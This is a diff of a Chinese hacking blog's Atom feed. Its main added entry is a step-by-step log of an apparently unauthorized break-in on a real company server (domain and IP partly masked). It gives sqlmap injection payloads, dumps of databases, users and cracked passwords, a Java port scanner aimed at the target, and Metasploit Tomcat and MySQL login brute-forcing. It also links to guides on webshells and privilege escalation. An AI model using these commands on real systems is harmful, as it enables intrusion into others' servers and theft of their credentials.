@@ -4,7 +4,7 @@
   <title><![CDATA[Category: hack | K]]></title>
   <link href="http://mzkmzk.github.io/blog/categories/hack/atom.xml" rel="self"/>
   <link href="http://mzkmzk.github.io/"/>
-  <updated>2015-07-17T00:00:28+08:00</updated>
+  <updated>2015-07-20T02:51:47+08:00</updated>
   <id>http://mzkmzk.github.io/</id>
   <author>
     <name><![CDATA[K]]></name>
@@ -12,6 +12,277 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[metasploit 安装]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/07/19/metasploit_install/"/>
+    <updated>2015-07-19T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/07/19/metasploit_install</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>注意点</p>
+
+<ol>
+<li>一定要注意教程的最低配置设定</li>
+<li>安装到最后会有个获取验证码..我试过qq、新浪和gmail都无法获取验证码,听说一定要企业邮箱 例如139(我还没尝试),别人给的我一个使用吗QWYW-M386-29JQ-PHMW</li>
+</ol>
+
+
+<h3>0x00下载地址</h3>
+
+<p><a href="http://www.rapid7.com/products/metasploit/download.jsp">http://www.rapid7.com/products/metasploit/download.jsp</a></p>
+
+<h3>0x01 教程下载地址</h3>
+
+<p><a href="https://community.rapid7.com/docs/DOC-2100">https://community.rapid7.com/docs/DOC-2100</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[sqlmap 渗透某集团]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw/"/>
+    <updated>2015-07-18T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00 找到盲注点</h3>
+
+<p>参考链接<a href="http://bluereader.org/article/59585524">http://bluereader.org/article/59585524</a></p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dbs
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Parameter: fax_id (GET)
+Type: UNION query
+Title: MySQL UNION query (NULL) - 4 columns
+Payload: fax_id=1' UNION ALL SELECT NULL,CONCAT(0x71786a7a71,0x72514471566c4b56546f,0x71706a7871),NULL,NULL#
+
+Type: AND/OR time-based blind
+Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
+Payload: fax_id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))dCsX) AND 'uYLq'='uYLq
+---
+
+available databases [3]:                                                       
+[*] information_schema
+[*] mysql
+[*] mysql3235
+</code></pre>
+
+<h3>0x01 查看数据库表和数据</h3>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --tables
+</code></pre>
+
+<p>就会得到数据库中的所有表,然后我随即抽了一个schedule表查看数据</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dump -T schedule
+</code></pre>
+
+<p>但是结果不如人意</p>
+
+<pre><code>[13:27:41] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+
+Database: mysql3235
+Table: schedule
+[0 entries]
++-------+---------+-----------+
+| TITLE | ENDTIME | STARTTIME |
++-------+---------+-----------+
++-------+---------+-----------+
+</code></pre>
+
+<h3>0x02 尝试爆破数据库密码</h3>
+
+<p>获取数据库用户</p>
+
+<pre><code> python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users
+
+database management system users [5]:                                          
+[*] ''@'localhost'
+[*] 'cubetech'@'localhost'
+[*] 'debugger'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'localhost'
+</code></pre>
+
+<p>获取数据库密码</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users --passwords
+
+database management system users password hashes:                              
+[*] cubetech [1]:
+password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+clear-text password: 123456
+[*] debugger [1]:
+password hash: *6D45DF82DF6169868F43DD422AB3229D376BD1BE
+clear-text password: debugger
+[*] root [1]:
+password hash: *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7
+</code></pre>
+
+<h3>0x03 探索Mysql端口</h3>
+
+<p>知道了数据库用户名和端口后 我就尝试远程链接数据库了.ip很容易得到. 应该是服务器本身 .这样的服务器管理员应该是不会做服务器和数据库分离的 .</p>
+
+<p>尝试了mysql的3306端口 失败!</p>
+
+<p>写了个java扫描哪些端口开启&hellip;</p>
+
+<pre><code>import java.net.Socket;
+
+import java.util.ArrayList;
+import java.util.List;
+
+
+public class Check_Open_Port {
+public static void main(String args[]) {
+    final List&lt;Integer&gt; li = new ArrayList&lt;Integer&gt;();
+    for (int i = 0; i &lt;= 65535; i++) {
+        li.add(i);
+    }
+
+    for (int i = 0; i &lt;= 100; i++) {
+        new Thread() {
+            public void run() {
+                while (li.size() != 0) {
+                    int li_get = 0;
+                    int num = (int) Math.floor(Math.random()* (li.size()));
+                    try {
+                        li_get = li.get(num);
+                        int num_remove_check =li.indexOf(li_get);
+                        if(num_remove_check!=-1)
+                        li.remove(num_remove_check);
+                        Socket client = new Socket("122.233.243.***",
+                                li_get);
+                        System.out.println("端口 : " + li_get + "已开放");
+                        client.close();
+                    } catch (Exception e) {
+                        System.out.println("端口 : " + li_get + "未开放");
+                    }
+                }
+            }
+        }.start();
+    }
+    //检测ip有无被封锁 和当前集合个数
+    new Thread() {
+        public void run() {
+            while (li.size() != 0) {
+                try {
+                    Socket client = new Socket("122.233.243.***", 80);
+                    System.out.println("端口 : " + 80 + "已开放");
+                    client.close();
+
+                } catch (Exception e) {
+                    System.out.println("端口 : " + 80 + "未开放");
+                }
+                System.out.println("当前集合个数 : "+li.size());
+                try {
+                    join(50000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }.start();
+}
+}
+</code></pre>
+
+<p>扫了好久..结果发现没有扫到 原因有两个</p>
+
+<ol>
+<li><p>其实扫到了 不过控制台信息太多了 把扫到的端口顶掉了 我应该把输出写到一个log里</p></li>
+<li><p>就是并发线程没控制好.一个线程remove list数据的时候,另外一个线程已经remove了.然后数据在List的位置就会改变,导致漏了好多端口.我应该做线程锁,或者写map的 检查过就把value设成true.</p></li>
+</ol>
+
+
+<p>好了扫描端口其实只是一个尝试,并没有太多技术含量.我决定要从Tomcat入手.尝试用metasploit破解Tomcat</p>
+
+<h3>0x04 metasploit 入侵Tomcat</h3>
+
+<p>终端输入</p>
+
+<pre><code>msfconsole
+</code></pre>
+
+<p>设置入侵Tomcat</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(tomcat_mgr_login) &gt; set RHoSTS 122.233.243.***
+RHoSTS =&gt; 122.233.243.***
+msf auxiliary(tomcat_mgr_login) &gt; set RPORT 80
+RPORT =&gt; 80
+msf auxiliary(tomcat_mgr_login) &gt; run
+</code></pre>
+
+<p>结果并没有破解出密码- -.</p>
+
+<p>参考文章<a href="http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html">http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html</a></p>
+
+<h3>0x05 再次尝试利用 metasploit 检测出 数据库端口</h3>
+
+<pre><code>msf &gt; nmap -Pn -sV 122.233.243.***
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-19 23:05 CST
+
+Nmap scan report for 122.233.243.***
+Host is up (0.13s latency).
+Not shown: 991 filtered ports
+
+PORT      STATE  SERVICE           VERSION
+80/tcp    open   http              Apache Tomcat/Coyote JSP engine 1.1
+135/tcp   closed msrpc
+139/tcp   closed netbios-ssn
+593/tcp   closed http-rpc-epmap
+3389/tcp  open   ms-wbt-server     Microsoft Terminal Service
+4444/tcp  closed krb524
+6059/tcp  open   tcpwrapped
+10000/tcp open   snet-sensor-mgmt?
+10010/tcp open   rxapi?
+Service Info: OS: Windows
+</code></pre>
+
+<p>好像并没有我们想得到的</p>
+
+<h3>0x06 穷途末路的我尝试了下mysql扫描</h3>
+
+<pre><code>msf auxiliary(tomcat_mgr_login) &gt; use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(mysql_login) &gt; set RHOSTS 122.233.243.***
+RHOSTS =&gt; 122.233.243.***
+msf auxiliary(mysql_login) &gt; run
+
+[-] 122.233.243.***:3306 MYSQL - Unable to connect: The connection timed out (122.233.243.***:3306).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>其实傻子也知道不可以- -因为看了下<code>info</code>扫的端口是3306 怎么可能可以&hellip;.</p>
+
+<p>参考链接<a href="http://www.bubuko.com/infodetail-343797.html">http://www.bubuko.com/infodetail-343797.html</a></p>
+
+<h3>0x07 利用sql-shell查端口</h3>
+
+<pre><code>show variables like 'port';
+
+or
+
+select * from global_variables where VARIABLE_NAME ='PORT';
+</code></pre>
+
+<p>上面2个命令都可以查询端口,但是global_variables表属于临时表,只在当前连接下显示,所以无法利用 但是还是想通过insert 插入到一个表中</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --sql-shell  "SELECT  'global_variables'" -v 5 
+
+insert into hr_event(name) select VARIABLE_NAME from information_schema.global_variables where VARIABLE_NAME ='PORT';
+[02:46:34] [WARNING] execution of custom SQL queries is only available when stacked queries are supported
+</code></pre>
+
+<p>通过sqlmap执行的sql-shell只能执行简单的查询,所以此法无效</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[hack思路]]></title>
@@ -52,6 +323,26 @@
 zm
 123
 报错</p>
+
+<h3>toncat登陆后挂马</h3>
+
+<p><a href="http://susam.iteye.com/blog/613431">http://susam.iteye.com/blog/613431</a></p>
+
+<h3>sqlmap &ndash;os-shell成功后</h3>
+
+<p><a href="http://www.t00ts.net/post-8.html">http://www.t00ts.net/post-8.html</a></p>
+
+<h3>黑正方</h3>
+
+<p><a href="http://blog.qiupeitong.com/">http://blog.qiupeitong.com/</a></p>
+
+<h2>mysql提权</h2>
+
+<p><a href="http://www.jinglingshu.org/?p=2513">http://www.jinglingshu.org/?p=2513</a></p>
+
+<h3>139和445打开后</h3>
+
+<p><a href="http://www.nxadmin.com/penetration/1126.html">http://www.nxadmin.com/penetration/1126.html</a></p>
 ]]></content>
   </entry>
   
@@ -80,104 +371,6 @@ zm
 <p><a href="http://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">http://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
 
 <p>不成功源于 : 本机测试 语句错误</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[mysql 常用命令积累]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/02/11/mysql_usual_order/"/>
-    <updated>2015-02-11T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/02/11/mysql_usual_order</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>查询mysql版本</h3>
-
-<pre><code>select version();
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Wifi网络抓包]]></title>
-    <link href="http://mzkmzk.github.io/blog/2014/10/05/Internet-wifi/"/>
-    <updated>2014-10-05T15:16:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2014/10/05/Internet-wifi</id>
-    <content type="html"><![CDATA[<h1>Wifi网络抓包duanU</h1>
-
-<p>环境
-Mac OS X 10.9.4</p>
-
-<p>工具
-WireShark1.10.6</p>
-
-<p>1.创建airport软链接</p>
-
-<pre><code>$sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport   /usr/sbin/airport
-</code></pre>
-
-<p>2.确定无线网卡名</p>
-
-<pre><code>$ifconfig
-en0:        flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500
-ether ********
-inet6 ****
-    inet *****
-     netmask 0xffffff00 broadcast *****
-nd6 options=1&lt;PERFORMNUD&gt;
-media: autoselect
-status: active
-</code></pre>
-
-<p>这里的en0是我的无线.</p>
-
-<p>3.确认通道</p>
-
-<pre><code>$airport en0 scan
- SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
- JENNY-PC_Network **** -66  1,+1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
- 我的通道是1
-$sudo airport -z//断开wifi
-$sudo airport -c1 //看CHANNEL的值
-
-确认一下~.
-$ airport -I
- agrCtlRSSI: 0
- agrExtRSSI: 0
-agrCtlNoise: 0
-agrExtNoise: 0
-      state: init
-    op mode: 
- lastTxRate: 0
-    maxRate: 0
-lastAssocStatus: 65535
-802.11 auth: open
-  link auth: wpa2-psk
-      BSSID: 0:0:0:0:0:0
-       SSID: 
-        MCS: -1
-    channel: 1
-</code></pre>
-
-<p>4.配置WireShark</p>
-
-<p>双击wifi -en0 配置嗅探设置</p>
-
-<p><img src="/images/blog/004.png" alt="image" /></p>
-
-<p>设置wifi密码</p>
-
-<p>Edit-> Peferences</p>
-
-<p><img src="/images/blog//005.png" alt="image" /></p>
-
-<p><img src="/images/blog//006.png" alt="image" /></p>
-
-<p>启动监听 (只能监听到在监听后连接的设备)</p>
-
-<p><img src="/images/blog//007.png" alt="image" /></p>
-
-<p>参考链接<a href="http://www.douban.com/note/328099725/">http://www.douban.com/note/328099725/</a></p>
 ]]></content>
   </entry>
   
